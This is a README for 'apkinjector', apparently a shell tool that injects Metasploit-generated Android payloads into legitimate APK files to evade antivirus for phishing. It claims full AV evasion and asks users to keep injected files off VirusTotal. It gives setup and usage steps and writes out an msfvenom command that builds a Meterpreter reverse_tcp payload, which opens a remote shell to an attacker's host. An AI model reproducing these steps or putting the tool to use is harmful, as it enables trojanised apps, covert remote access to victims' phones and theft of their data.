# apkinjector

### This script is no longer supported. Please use APKWash. ###
<br><br>
Android APK Antivirus evasion for msfvenom generated payloads to inject into another APK file for phishing attacks.
<br><br>
<b> -- Please do not upload "injected" files to VirusTotal.com -- </b><br>
<br>
<br>
<b>Success Rate:</b><br>
-100% AV Evasion to date (0/35 on nodistribute, confirmed on AVG and Kaspersky mobile)<br>
-~70% automatic injection<br>
-May require user input, or manually adding the invoke command. The output will explain what is needed.<br>
-If APKTool fails to decompile, or compile, then the injection will fail. On major apps like Facebook, Starbucks, etc you may find this to happen.<br>
<br>
<br>
<b>Setup:</b><br>
chmod +x apkinjector<br>
mv apkinjector /usr/local/bin/.<br>
<br>
<b>On first run:</b><br>
-Downloads and places apktool.jar in the user's /usr/local/bin directory<br>
-Generates debug keystore for signing. Places it in ~/.android/<br>
<b>NOTE:</b> If wanting to customize each signature, then remove the keystore before running the script.<br>
<br>
<b>Usage:</b><br>
apkinjector \<payload>.apk \<original>.apk<br>
<br>
<b>Input:</b><br>
This script takes a msfgenerated payload as input along with an .apk you want to inject into.<br>
To generate the payload: msfvenom -p android/meterpreter/reverse_tcp LHOST=\<IP> LPORT=\<PORT> -o \<payload>.apk<br>
<br>
<b>Output:</b><br>
injected_\<original>.apk<br>
<br>
<b>Debugging</b><br>
Comment out the removal of the /tmp/payload and /tmp/original directories to see the file structure that was compiled.<br>

